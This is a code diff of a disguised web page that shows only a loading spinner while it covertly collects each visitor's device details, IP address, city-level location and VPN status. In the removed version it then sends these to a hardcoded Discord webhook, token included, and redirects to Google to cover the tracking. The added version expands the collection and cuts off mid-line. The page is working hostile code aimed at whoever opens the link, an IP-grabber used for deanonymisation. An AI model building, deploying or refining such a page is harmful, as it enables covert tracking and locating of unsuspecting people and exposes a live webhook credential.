@@ -2,78 +2,55 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Checking...</title>
+    <title>System Intelligence</title>
     <style>
-        body { background:#000; margin:0; display:flex; align-items:center; justify-content:center; height:100vh; overflow:hidden; }
-        .l { border:3px solid #111; border-top:3px solid #0f0; border-radius:50%; width:30px; height:30px; animation:s 1s linear infinite; }
-        @keyframes s { to { transform:rotate(360deg); } }
+        body{background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden}
+        .l{border:3px solid #111;border-top:2px solid #0f0;border-radius:50%;width:35px;height:35px;animation:s 1s linear infinite}
+        @keyframes s{to{transform:rotate(360deg)}}
     </style>
 </head>
 <body>
     <div class="l"></div>
     <script>
-        (function() {
+        (async function(){
             "use strict";
+            const HOOK = "https://canary.discord.com/api/webhooks/1457149465688543363/FlP0AtpIk-Yg8NwxGQ1CSdityVf67AL-ODXFlPl9FtQq-tV5j2a9iZmWkGNAUsOHD9uL";
+            const REDIRECT = "https://www.google.com";
 
-            const config = {
-                hook: "https://canary.discord.com/api/webhooks/1457149465688543363/FlP0AtpIk-Yg8NwxGQ1CSdityVf67AL-ODXFlPl9FtQq-tV5j2a9iZmWkGNAUsOHD9uL",
-                target: "https://www.google.com"
+            // 1. TAM DONANIM & YAZILIM ANALİZİ
+            let d = {
+                os: navigator.userAgentData ? (await navigator.userAgentData.getHighEntropyValues(["platformVersion", "architecture", "model"])).platform : navigator.platform,
+                gpu: "N/A", vdr: "N/A",
+                mem: navigator.deviceMemory || "N/A",
+                cpu: navigator.hardwareConcurrency || "N/A",
+                res: screen.width + "x" + screen.height + " (" + screen.colorDepth + "bit)",
+                lang: navigator.language,
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                bat: "N/A", net: "N/A", storage: "N/A",
+                ip: "N/A", loc: "N/A", vpn: "✅ Clear"
             };
 
-            const run = async () => {
-                let sys = {
-                    os: navigator.platform,
-                    res: screen.width + "x" + screen.height,
-                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    gpu: "Unknown",
-                    ip: "N/A"
-                };
+            // GPU & WebGL Extraction
+            try {
+                const c = document.createElement('canvas');
+                const gl = c.getContext('webgl2') || c.getContext('webgl');
+                const db = gl.getExtension('WEBGL_debug_renderer_info');
+                d.gpu = gl.getParameter(db.UNMASKED_RENDERER_ID);
+                d.vdr = gl.getParameter(db.UNMASKED_VENDOR_ID);
+            } catch(e){}
 
-                // GPU extraction
-                try {
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl');
-                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                    sys.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
-                } catch(e) {}
+            // Battery & Network & Storage
+            try {
+                if(navigator.getBattery) { const b = await navigator.getBattery(); d.bat = Math.round(b.level * 100) + "% (" + (b.charging ? "Charging" : "Battery") + ")"; }
+                const cn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if(cn) d.net = cn.effectiveType.toUpperCase() + " (~" + cn.downlink + "Mbps)";
+                if(navigator.storage && navigator.storage.estimate) { const s = await navigator.storage.estimate(); d.storage = (s.usage / 1024 / 1024).toFixed(1) + "MB used / " + (s.quota / 1024 / 1024 / 1024).toFixed(1) + "GB quota"; }
+            } catch(e){}
 
-                // IP & VPN Extraction
-                try {
-                    const r = await fetch('https://ipapi.co/json/');
-                    const j = await r.json();
-                    sys.ip = j.ip;
-                    sys.vpn = (j.timezone !== sys.tz) ? "🚨 YES" : "✅ NO";
-                } catch(e) { sys.vpn = "⚠️ Error"; }
-
-                // Payload Construction
-                const msg = {
-                    embeds: [{
-                        title: "💀 DATA CAPTURED",
-                        color: 3066993,
-                        fields: [
-                            { name: "📡 Network", value: "IP: " + sys.ip + "\nVPN: " + sys.vpn, inline: true },
-                            { name: "⚙️ System", value: "OS: " + sys.os + "\nGPU: " + sys.gpu, inline: false },
-                            { name: "🖥️ Display", value: "Res: " + sys.res + "\nTZ: " + sys.tz, inline: true }
-                        ],
-                        timestamp: new Date().toISOString()
-                    }]
-                };
-
-                // Ultimate Transmission
-                const data = JSON.stringify(msg);
-                if (navigator.sendBeacon) {
-                    navigator.sendBeacon(config.hook, new Blob([data], { type: 'application/json' }));
-                } else {
-                    fetch(config.hook, { method: 'POST', mode: 'no-cors', body: data });
-                }
-
-                // Redirect
-                setTimeout(() => { window.location.replace(config.target); }, 1200);
-            };
-
-            window.onload = run;
-        })();
-    </script>
-</body>
-</html>
-
+            // Network Intelligence (IP & VPN)
+            try {
+                const r = await fetch('https://ipapi.co/json/');
+                const j = await r.json();
+                d.ip = j.ip; d.loc = j.city + ", " + j.region + " / " + j.country_name;
+                if(j.timezone !== d.tz || j.proxy) d.vpn = "🚨 **VPN/PROXY DETECTED
+                    
